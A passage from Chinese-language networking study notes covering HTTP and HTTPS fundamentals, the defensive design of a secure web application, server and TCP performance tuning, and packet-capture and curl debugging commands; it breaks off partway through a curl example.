</span>异步IO<br><br>现在的挑战：<br>C100K、C1000K（百万并发）<br></code></pre></td></tr></table></figure><h3 id="1-5-第19天：HTTP协议基础"><a href="#1-5-第19天：HTTP协议基础" class="headerlink" title="1.5 第19天：HTTP协议基础"></a>1.5 第19天：HTTP协议基础</h3><p><strong>核心知识</strong>：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">HTTP特点：<br><span class="hljs-bullet">- </span>应用层协议<br><span class="hljs-bullet">- </span>无状态<br><span class="hljs-bullet">- </span>明文传输<br><span class="hljs-bullet">- </span>请求-响应模式<br><br>HTTP格式：<br>请求 = 请求行 <span class="hljs-code">+ 请求头 +</span> 空行 + 请求体<br>响应 = 状态行 <span class="hljs-code">+ 响应头 +</span> 空行 + 响应体<br><br>HTTP方法：<br><span class="hljs-bullet">- </span>GET：查询<br><span class="hljs-bullet">- </span>POST：创建<br><span class="hljs-bullet">- </span>PUT：更新（完整）<br><span class="hljs-bullet">- </span>PATCH：更新（部分）<br><span class="hljs-bullet">- </span>DELETE：删除<br><span class="hljs-bullet">- </span>HEAD：获取头部<br><span class="hljs-bullet">- </span>OPTIONS：查询方法<br><br>状态码：<br>1xx：信息<br>2xx：成功（200 OK）<br>3xx：重定向（301、302、304）<br>4xx：客户端错误（400、401、403、404）<br>5xx：服务器错误（500、502、503）<br></code></pre></td></tr></table></figure><p><strong>关键概念</strong>：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Cookie</span> vs Session：<br><span class="hljs-attribute">Cookie</span>：客户端存储<br><span class="hljs-attribute">Session</span>：服务器存储<br><br><span class="hljs-attribute">HTTP</span>版本：<br><span class="hljs-attribute">HTTP</span>/<span class="hljs-number">1</span>.<span class="hljs-number">0</span>：短连接<br><span class="hljs-attribute">HTTP</span>/<span class="hljs-number">1</span>.<span class="hljs-number">1</span>：持久连接<br><span class="hljs-attribute">HTTP</span>/<span class="hljs-number">2</span>：多路复用、二进制<br><span class="hljs-attribute">HTTP</span>/<span class="hljs-number">3</span>：基于QUIC(UDP)<br></code></pre></td></tr></table></figure><h3 id="1-6-第20天：HTTPS和安全"><a href="#1-6-第20天：HTTPS和安全" class="headerlink" title="1.6 第20天：HTTPS和安全"></a>1.6 第20天：HTTPS和安全</h3><p><strong>核心知识</strong>：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">HTTPS = HTTP + TLS/SSL<br><br>加密技术：<br><span class="hljs-bullet">- </span>对称加密：AES（快速）<br><span class="hljs-bullet">- </span>非对称加密：RSA（安全）<br><span class="hljs-bullet">- </span>哈希函数：SHA-256<br><span class="hljs-bullet">- </span>数字签名：身份认证<br><br>TLS握手：<br>TLS 1.2：2-RTT<br>TLS 1.3：1-RTT（更快）<br><br>证书：<br><span class="hljs-bullet">- </span>DV：域名验证<br><span class="hljs-bullet">- </span>OV：组织验证<br><span class="hljs-bullet">- </span>EV：扩展验证<br><br>安全攻击：<br><span class="hljs-bullet">- </span>中间人攻击（MITM）<br><span class="hljs-bullet">- </span>SSL剥离<br><span class="hljs-bullet">- </span>XSS<br><span class="hljs-bullet">- </span>CSRF<br><span class="hljs-bullet">- </span>SQL注入<br></code></pre></td></tr></table></figure><p><strong>关键概念</strong>：</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">混合加密：<br><span class="hljs-number">1</span>. RSA交换对称密钥（安全）<br><span class="hljs-number">2</span>. AES加密实际数据（快速）<br><br>HSTS：<br><span class="hljs-keyword">Strict</span>-Transport-Security<br>强制使用HTTPS<br>防止SSL剥离攻击<br><br><span class="hljs-keyword">Let</span><span class="hljs-comment">&#x27;s Encrypt：</span><br>免费的CA<br>自动化证书管理<br><span class="hljs-number">90</span>天有效期<br></code></pre></td></tr></table></figure><hr><h2 id="2-综合实战项目：安全Web应用平台"><a href="#2-综合实战项目：安全Web应用平台" class="headerlink" title="2. 综合实战项目：安全Web应用平台"></a>2. 综合实战项目：安全Web应用平台</h2><h3 id="2-1-项目需求"><a href="#2-1-项目需求" class="headerlink" title="2.1 项目需求"></a>2.1 项目需求</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs markdown">项目名称：SecureWebApp<br>项目描述：一个安全的Web应用平台<br><br>功能需求：<br><span class="hljs-bullet">1.</span> 用户管理<br><span class="hljs-bullet">   -</span> 注册/登录<br><span class="hljs-bullet">   -</span> Session管理<br><span class="hljs-bullet">   -</span> 权限控制<br><br><span class="hljs-bullet">2.</span> 数据API<br><span class="hljs-bullet">   -</span> RESTful API<br><span class="hljs-bullet">   -</span> JSON格式<br><span class="hljs-bullet">   -</span> CRUD操作<br><br><span class="hljs-bullet">3.</span> 实时通信<br><span class="hljs-bullet">   -</span> WebSocket（模拟）<br><span class="hljs-bullet">   -</span> 实时消息推送<br><br><span class="hljs-bullet">4.</span> 文件服务<br><span class="hljs-bullet">   -</span> 静态文件服务<br><span class="hljs-bullet">   -</span> 文件上传/下载<br><br><span class="hljs-bullet">5.</span> 安全特性<br><span class="hljs-bullet">   -</span> HTTPS支持<br><span class="hljs-bullet">   -</span> Cookie安全<br><span class="hljs-bullet">   -</span> CSRF防护<br><span class="hljs-bullet">   -</span> XSS防护<br><span class="hljs-bullet">   -</span> 输入验证<br><br>技术要求：<br><span class="hljs-bullet">-</span> 支持HTTP和HTTPS<br><span class="hljs-bullet">-</span> 使用IO多路复用（epoll/select）<br><span class="hljs-bullet">-</span> 实现完整的HTTP/1.1协议<br><span class="hljs-bullet">-</span> 安全最佳实践<br><span class="hljs-bullet">-</span> 性能监控<br><span class="hljs-bullet">-</span> 日志记录<br></code></pre></td></tr></table></figure><h3 id="2-2-项目架构"><a href="#2-2-项目架构" class="headerlink" title="2.2 项目架构"></a>2.2 项目架构</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs markdown">┌─────────────────────────────────────────┐<br>│           客户端（浏览器）               │<br>└─────────────────────────────────────────┘<br><span class="hljs-code">                    │</span><br><span class="hljs-code">                    │ HTTPS</span><br><span class="hljs-code">                    ↓</span><br><span class="hljs-code">┌─────────────────────────────────────────┐</span><br><span class="hljs-code">│          负载均衡（可选）                │</span><br><span class="hljs-code">└─────────────────────────────────────────┘</span><br><span class="hljs-code">                    │</span><br><span class="hljs-code">        ┌───────────┼───────────┐</span><br><span class="hljs-code">        │           │           │</span><br><span class="hljs-code">        ↓           ↓           ↓</span><br><span class="hljs-code">┌─────────┐   ┌─────────┐   ┌─────────┐</span><br><span class="hljs-code">│  Web    │   │  Web    │   │  Web    │</span><br><span class="hljs-code">│ Server  │   │ Server  │   │ Server  │</span><br><span class="hljs-code">│  进程1  │   │  进程2  │   │  进程3  │</span><br><span class="hljs-code">└─────────┘   └─────────┘   └─────────┘</span><br><span class="hljs-code">        │           │           │</span><br><span class="hljs-code">        └───────────┼───────────┘</span><br><span class="hljs-code">                    │</span><br><span class="hljs-code">                    ↓</span><br><span class="hljs-code">┌─────────────────────────────────────────┐</span><br><span class="hljs-code">│          数据存储（JSON文件/数据库）     │</span><br><span class="hljs-code">└─────────────────────────────────────────┘</span><br><span class="hljs-code"></span><br>模块划分：<br><span class="hljs-bullet">1.</span> HTTP服务器模块<br><span class="hljs-bullet">   -</span> 请求解析<br><span class="hljs-bullet">   -</span> 响应生成<br><span class="hljs-bullet">   -</span> 路由管理<br><br><span class="hljs-bullet">2.</span> HTTPS模块<br><span class="hljs-bullet">   -</span> SSL/TLS处理<br><span class="hljs-bullet">   -</span> 证书管理<br><br><span class="hljs-bullet">3.</span> 认证模块<br><span class="hljs-bullet">   -</span> 用户注册/登录<br><span class="hljs-bullet">   -</span> Session管理<br><span class="hljs-bullet">   -</span> 权限验证<br><br><span class="hljs-bullet">4.</span> API模块<br><span class="hljs-bullet">   -</span> RESTful接口<br><span class="hljs-bullet">   -</span> 数据处理<br><br><span class="hljs-bullet">5.</span> 文件模块<br><span class="hljs-bullet">   -</span> 静态文件<br><span class="hljs-bullet">   -</span> 文件上传<br><br><span class="hljs-bullet">6.</span> 安全模块<br><span class="hljs-bullet">   -</span> CSRF Token<br><span class="hljs-bullet">   -</span> XSS过滤<br><span class="hljs-bullet">   -</span> 输入验证<br><br><span class="hljs-bullet">7.</span> 监控模块<br><span class="hljs-bullet">   -</span> 性能统计<br><span class="hljs-bullet">   -</span> 日志记录<br></code></pre></td></tr></table></figure><h3 id="2-3-核心功能实现"><a href="#2-3-核心功能实现" class="headerlink" title="2.3 核心功能实现"></a>2.3 核心功能实现</h3><p><strong>用户认证流程</strong>：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs markdown">注册：<br><span class="hljs-bullet">1.</span> 用户提交注册表单（POST /api/register）<br><span class="hljs-bullet">2.</span> 服务器验证输入（用户名、密码、邮箱）<br><span class="hljs-bullet">3.</span> 密码哈希（使用bcrypt或类似算法）<br><span class="hljs-bullet">4.</span> 存储到数据库<br><span class="hljs-bullet">5.</span> 返回成功<br><br>登录：<br><span class="hljs-bullet">1.</span> 用户提交登录表单（POST /api/login）<br><span class="hljs-bullet">2.</span> 服务器验证用户名和密码<br><span class="hljs-bullet">3.</span> 创建Session<br><span class="hljs-bullet">4.</span> 设置Session Cookie（HttpOnly、Secure、SameSite）<br><span class="hljs-bullet">5.</span> 返回成功<br><br>认证检查：<br><span class="hljs-bullet">1.</span> 客户端请求带上Cookie<br><span class="hljs-bullet">2.</span> 服务器解析Cookie获取Session ID<br><span class="hljs-bullet">3.</span> 查找Session数据<br><span class="hljs-bullet">4.</span> 验证Session有效性<br><span class="hljs-bullet">5.</span> 获取用户信息<br><span class="hljs-bullet">6.</span> 继续处理请求<br></code></pre></td></tr></table></figure><p><strong>安全措施</strong>：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> CSRF防护<br><span class="hljs-bullet">   -</span> 生成CSRF Token<br><span class="hljs-bullet">   -</span> 存储在Session中<br><span class="hljs-bullet">   -</span> 表单中包含Token<br><span class="hljs-bullet">   -</span> 服务器验证Token<br><br><span class="hljs-bullet">2.</span> XSS防护<br><span class="hljs-bullet">   -</span> 输出编码（HTML实体）<br><span class="hljs-bullet">   -</span> Content-Security-Policy头<br><span class="hljs-bullet">   -</span> HttpOnly Cookie<br><br><span class="hljs-bullet">3.</span> SQL注入防护<br><span class="hljs-bullet">   -</span> 参数化查询<br><span class="hljs-bullet">   -</span> ORM框架<br><span class="hljs-bullet">   -</span> 输入验证<br><br><span class="hljs-bullet">4.</span> 密码安全<br><span class="hljs-bullet">   -</span> 强密码要求<br><span class="hljs-bullet">   -</span> 密码哈希（bcrypt、argon2）<br><span class="hljs-bullet">   -</span> 加盐（Salt）<br><span class="hljs-bullet">   -</span> 限制登录尝试<br><br><span class="hljs-bullet">5.</span> HTTPS<br><span class="hljs-bullet">   -</span> 强制HTTPS（HSTS）<br><span class="hljs-bullet">   -</span> 只使用TLS 1.2+<br><span class="hljs-bullet">   -</span> 强加密套件<br></code></pre></td></tr></table></figure><hr><h2 id="3-性能优化技巧"><a href="#3-性能优化技巧" class="headerlink" title="3. 性能优化技巧"></a>3. 性能优化技巧</h2><h3 id="3-1-服务器端优化"><a href="#3-1-服务器端优化" class="headerlink" title="3.1 服务器端优化"></a>3.1 服务器端优化</h3><p><strong>IO优化</strong>：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> 使用epoll（Linux）<br><span class="hljs-bullet">   -</span> O(1)复杂度<br><span class="hljs-bullet">   -</span> 边缘触发<br><span class="hljs-bullet">   -</span> 百万并发<br><br><span class="hljs-bullet">2.</span> 非阻塞IO<br><span class="hljs-bullet">   -</span> 提高并发能力<br><span class="hljs-bullet">   -</span> 避免线程阻塞<br><br><span class="hljs-bullet">3.</span> 零拷贝<br><span class="hljs-bullet">   -</span> sendfile()系统调用<br><span class="hljs-bullet">   -</span> 减少数据拷贝<br><span class="hljs-bullet">   -</span> 提高文件传输效率<br><br><span class="hljs-bullet">4.</span> 内存映射<br><span class="hljs-bullet">   -</span> mmap()<br><span class="hljs-bullet">   -</span> 直接映射文件到内存<br><span class="hljs-bullet">   -</span> 适合大文件<br></code></pre></td></tr></table></figure><p><strong>连接优化</strong>：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> 连接池<br><span class="hljs-bullet">   -</span> 复用连接<br><span class="hljs-bullet">   -</span> 减少建立开销<br><br><span class="hljs-bullet">2.</span> Keep-Alive<br><span class="hljs-bullet">   -</span> HTTP持久连接<br><span class="hljs-bullet">   -</span> 复用TCP连接<br><br><span class="hljs-bullet">3.</span> 连接限制<br><span class="hljs-bullet">   -</span> 限制最大连接数<br><span class="hljs-bullet">   -</span> 防止资源耗尽<br><br><span class="hljs-bullet">4.</span> 超时设置<br><span class="hljs-bullet">   -</span> 读超时<br><span class="hljs-bullet">   -</span> 写超时<br><span class="hljs-bullet">   -</span> 空闲超时<br></code></pre></td></tr></table></figure><p><strong>缓存优化</strong>：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> 静态资源缓存<br><span class="hljs-bullet">   -</span> Cache-Control头<br><span class="hljs-bullet">   -</span> ETag<br><span class="hljs-bullet">   -</span> Last-Modified<br><br><span class="hljs-bullet">2.</span> 内存缓存<br><span class="hljs-bullet">   -</span> Redis<br><span class="hljs-bullet">   -</span> Memcached<br><span class="hljs-bullet">   -</span> 应用内缓存<br><br><span class="hljs-bullet">3.</span> CDN<br><span class="hljs-bullet">   -</span> 内容分发网络<br><span class="hljs-bullet">   -</span> 边缘缓存<br><span class="hljs-bullet">   -</span> 减少延迟<br><br><span class="hljs-bullet">4.</span> 浏览器缓存<br><span class="hljs-bullet">   -</span> 强缓存<br><span class="hljs-bullet">   -</span> 协商缓存<br></code></pre></td></tr></table></figure><p><strong>并发优化</strong>：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> 多进程<br><span class="hljs-bullet">   -</span> 利用多核CPU<br><span class="hljs-bullet">   -</span> 进程隔离<br><span class="hljs-bullet">   -</span> 稳定性好<br><br><span class="hljs-bullet">2.</span> 线程池<br><span class="hljs-bullet">   -</span> 固定数量线程<br><span class="hljs-bullet">   -</span> 任务队列<br><span class="hljs-bullet">   -</span> 避免频繁创建<br><br><span class="hljs-bullet">3.</span> 协程<br><span class="hljs-bullet">   -</span> 轻量级<br><span class="hljs-bullet">   -</span> 高并发<br><span class="hljs-bullet">   -</span> 适合IO密集<br><br><span class="hljs-bullet">4.</span> 异步编程<br><span class="hljs-bullet">   -</span> asyncio<br><span class="hljs-bullet">   -</span> 事件循环<br><span class="hljs-bullet">   -</span> 回调函数<br></code></pre></td></tr></table></figure><h3 id="3-2-网络优化"><a href="#3-2-网络优化" class="headerlink" title="3.2 网络优化"></a>3.2 网络优化</h3><p><strong>TCP优化</strong>：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-number">1</span>. 调整窗口大小<br>   net<span class="hljs-selector-class">.ipv4</span><span class="hljs-selector-class">.tcp_window_scaling</span> = <span class="hljs-number">1</span><br>   net<span class="hljs-selector-class">.core</span><span class="hljs-selector-class">.rmem_max</span> = <span class="hljs-number">16777216</span><br>   net<span class="hljs-selector-class">.core</span><span class="hljs-selector-class">.wmem_max</span> = <span class="hljs-number">16777216</span><br><br><span class="hljs-number">2</span>. 启用快速回收<br>   net<span class="hljs-selector-class">.ipv4</span><span class="hljs-selector-class">.tcp_tw_reuse</span> = <span class="hljs-number">1</span><br>   net<span class="hljs-selector-class">.ipv4</span><span class="hljs-selector-class">.tcp_fin_timeout</span> = <span class="hljs-number">30</span><br><br><span class="hljs-number">3</span>. 调整队列长度<br>   net<span class="hljs-selector-class">.core</span><span class="hljs-selector-class">.somaxconn</span> = <span class="hljs-number">1024</span><br>   net<span class="hljs-selector-class">.ipv4</span><span class="hljs-selector-class">.tcp_max_syn_backlog</span> = <span class="hljs-number">2048</span><br><br><span class="hljs-number">4</span>. 启用BBR拥塞控制<br>   net<span class="hljs-selector-class">.ipv4</span><span class="hljs-selector-class">.tcp_congestion_control</span> = bbr<br></code></pre></td></tr></table></figure><p><strong>HTTP优化</strong>：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> HTTP/2<br><span class="hljs-bullet">   -</span> 多路复用<br><span class="hljs-bullet">   -</span> 头部压缩<br><span class="hljs-bullet">   -</span> 服务器推送<br><br><span class="hljs-bullet">2.</span> 压缩<br><span class="hljs-bullet">   -</span> Gzip<br><span class="hljs-bullet">   -</span> Brotli<br><span class="hljs-bullet">   -</span> 减少传输大小<br><br><span class="hljs-bullet">3.</span> 减少请求<br><span class="hljs-bullet">   -</span> 合并文件<br><span class="hljs-bullet">   -</span> CSS Sprite<br><span class="hljs-bullet">   -</span> 内联小资源<br><br><span class="hljs-bullet">4.</span> 异步加载<br><span class="hljs-bullet">   -</span> defer、async<br><span class="hljs-bullet">   -</span> 懒加载<br><span class="hljs-bullet">   -</span> 按需加载<br></code></pre></td></tr></table></figure><h3 id="3-3-数据库优化"><a href="#3-3-数据库优化" class="headerlink" title="3.3 数据库优化"></a>3.3 数据库优化</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> 索引优化<br><span class="hljs-bullet">   -</span> 合理创建索引<br><span class="hljs-bullet">   -</span> 避免过度索引<br><span class="hljs-bullet">   -</span> 定期维护<br><br><span class="hljs-bullet">2.</span> 查询优化<br><span class="hljs-bullet">   -</span> 避免SELECT *<br><span class="hljs-bullet">   -</span> 使用LIMIT<br><span class="hljs-bullet">   -</span> 避免N+1查询<br><br><span class="hljs-bullet">3.</span> 连接池<br><span class="hljs-bullet">   -</span> 复用连接<br><span class="hljs-bullet">   -</span> 限制最大连接<br><br><span class="hljs-bullet">4.</span> 读写分离<br><span class="hljs-bullet">   -</span> 主从复制<br><span class="hljs-bullet">   -</span> 分散负载<br></code></pre></td></tr></table></figure><hr><h2 id="4-调试和排错"><a href="#4-调试和排错" class="headerlink" title="4. 调试和排错"></a>4. 调试和排错</h2><h3 id="4-1-网络抓包工具"><a href="#4-1-网络抓包工具" class="headerlink" title="4.1 网络抓包工具"></a>4.1 网络抓包工具</h3><p><strong>Wireshark</strong>：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs markdown">使用场景：<br><span class="hljs-bullet">-</span> 分析网络流量<br><span class="hljs-bullet">-</span> 查看数据包详情<br><span class="hljs-bullet">-</span> 诊断网络问题<br><br>常用过滤器：<br>tcp.port == 80              # HTTP流量<br>tcp.port == 443             # HTTPS流量<br>http.request.method == GET  # GET请求<br>ip.addr == 192.168.1.100    # 特定IP<br><br>操作步骤：<br><span class="hljs-bullet">1.</span> 选择网络接口<br><span class="hljs-bullet">2.</span> 开始捕获<br><span class="hljs-bullet">3.</span> 应用过滤器<br><span class="hljs-bullet">4.</span> 分析数据包<br><span class="hljs-bullet">5.</span> 导出数据<br></code></pre></td></tr></table></figure><p><strong>tcpdump</strong>：</p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs pf">基本用法：<br><span class="hljs-comment"># 捕获指定端口</span><br>sudo tcpdump -i <span class="hljs-literal">any</span> <span class="hljs-keyword">port</span> <span class="hljs-number">80</span><br><br><span class="hljs-comment"># 保存到文件</span><br>sudo tcpdump -i <span class="hljs-literal">any</span> <span class="hljs-keyword">port</span> <span class="hljs-number">80</span> -w capture.pcap<br><br><span class="hljs-comment"># 读取文件</span><br>tcpdump -r capture.pcap<br><br><span class="hljs-comment"># 过滤主机</span><br>sudo tcpdump -i <span class="hljs-literal">any</span> host <span class="hljs-number">192.168</span>.<span class="hljs-number">1.100</span><br><br><span class="hljs-comment"># 详细输出</span><br>sudo tcpdump -i <span class="hljs-literal">any</span> <span class="hljs-keyword">port</span> <span class="hljs-number">80</span> -v -X<br></code></pre></td></tr></table></figure><h3 id="4-2-命令行工具"><a href="#4-2-命令行工具" class="headerlink" title="4.2 命令行工具"></a>4.2 命令行工具</h3><p><strong>curl</strong>：</p><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs q">基本请求：<br>curl http:<span class="hljs-comment">//example.com</span><br><br>显示头部：<br>curl -I http:<span class="hljs-comment">//example.com</span><br><br>POST请求：<br>curl -X POST -d &#x27;&#123;<span class="hljs-string">&quot;key&quot;</span>:<span class="hljs-string">&quot;value&quot;</span>&#125;&#x27; \<br>  -H <span class="hljs-string">&quot;Content-Type: application/json&quot;</span> \<br>  http:<span 